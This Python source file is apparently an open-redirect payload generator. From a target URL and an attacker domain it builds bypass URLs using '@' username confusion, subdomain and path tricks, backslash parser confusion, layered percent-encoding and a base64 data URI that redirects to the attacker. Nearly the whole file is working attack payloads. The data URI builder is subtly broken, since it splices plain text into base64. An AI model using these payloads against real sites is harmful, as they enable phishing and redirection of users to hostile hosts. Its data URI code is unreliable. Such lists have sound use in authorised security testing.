from urllib.parse import urlparse


# ==========================================
# Helpers
# ==========================================

def extract_hostname(url):

    try:
        return urlparse(url).hostname
    except:
        return None


# ==========================================
# BASIC MODE
# ==========================================

def basic_payloads(attacker):

    return [

        f"https://{attacker}",
        f"http://{attacker}",

        f"//{attacker}",

        f"https:{attacker}",
        f"https;{attacker}",

    ]


# ==========================================
# PREFIX / SUFFIX BYPASS
# ==========================================

def prefix_payloads(host, attacker):

    return [

        f"https://{host}.{attacker}",
        f"https://{attacker}/{host}",

        f"https://{host}.{attacker}/{host}",

        f"https://{attacker}%2f{host}",

    ]


# ==========================================
# USERNAME CONFUSION
# ==========================================

def username_payloads(host, attacker):

    return [

        f"https://{host}@{attacker}",
        f"https://{host}%40{attacker}",

        f"https://{attacker}@{host}",
        f"https://{attacker}%40{host}",

    ]


# ==========================================
# PATH CONFUSION
# ==========================================

def path_payloads(host, attacker):

    return [

        f"https://{attacker}/{host}",
        f"https://{attacker}//{host}",

        f"https://{attacker}/..;/{host}",
        f"https://{attacker}/%2e%2e/{host}",

    ]


# ==========================================
# PARSER CONFUSION
# ==========================================

def parser_payloads(attacker):

    return [

        f"https:{attacker}",
        f"https;{attacker}",

        f"https:/\\/{attacker}",
        f"https:\\\\{attacker}",

        f"https://{attacker}\\@example.com",
        f"https://{attacker}%5c@example.com",

    ]


# ==========================================
# ENCODING BYPASS
# ==========================================

def encoding_payloads(host, attacker):

    return [

        f"https://{host}%2f@{attacker}",
        f"https://{host}%252f@{attacker}",
        f"https://{host}%25252f@{attacker}",

        f"https://{attacker}%2f@{host}",
        f"https://{attacker}%252f@{host}",
        f"https://{attacker}%25252f@{host}",

    ]


# ==========================================
# DATA URI PAYLOADS
# ==========================================

def data_payloads(attacker):

    return [

        (
            "data:text/html;base64,"
            "PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly8"
            + attacker +
            "Ijwvc2NyaXB0Pg=="
        ),

    ]


# ==========================================
# MIXED BYPASS
# ==========================================

def mixed_payloads(host, attacker):

    return [

        f"https://{host}%252f@{attacker}/{host}",

        f"https://{host}.{attacker}%252f@{attacker}",

        f"https://{host}@{attacker}/{host}",

        f"https://{host}%40{attacker}%252f{host}",

    ]


# ==========================================
# CUSTOM MODE
# ==========================================

def custom_payloads(host, attacker):

    payloads = []

    payloads.extend(
        prefix_payloads(host, attacker)
    )

    payloads.extend(
        username_payloads(host, attacker)
    )

    payloads.extend(
        path_payloads(host, attacker)
    )

    payloads.extend(
        parser_payloads(attacker)
    )

    payloads.extend(
        encoding_payloads(host, attacker)
    )

    payloads.extend(
        mixed_payloads(host, attacker)
    )

    return payloads


# ==========================================
# FULL MODE
# ==========================================

def full_payloads(host, attacker):

    payloads = []

    payloads.extend(
        basic_payloads(attacker)
    )

    payloads.extend(
        custom_payloads(host, attacker)
    )

    payloads.extend(
        data_payloads(attacker)
    )

    return payloads


# ==========================================
# GENERATE PAYLOADS
# ==========================================

def generate_payloads(
    target_url,
    attacker_domain,
    mode="basic"
):

    host = extract_hostname(target_url)

    if not host:
        return []

    payloads = []

    # ======================================
    # BASIC
    # ======================================

    if mode == "basic":

        payloads.extend(
            basic_payloads(attacker_domain)
        )

    # ======================================
    # CUSTOM
    # ======================================

    elif mode == "custom":

        payloads.extend(
            custom_payloads(
                host,
                attacker_domain
            )
        )

    # ======================================
    # FULL
    # ======================================

    elif mode == "full":

        payloads.extend(
            full_payloads(
                host,
                attacker_domain
            )
        )

    # ======================================
    # DEFAULT
    # ======================================

    else:

        payloads.extend(
            basic_payloads(attacker_domain)
        )

    # Remove duplicates while preserving order

    payloads = list(
        dict.fromkeys(payloads)
    )

    return payloads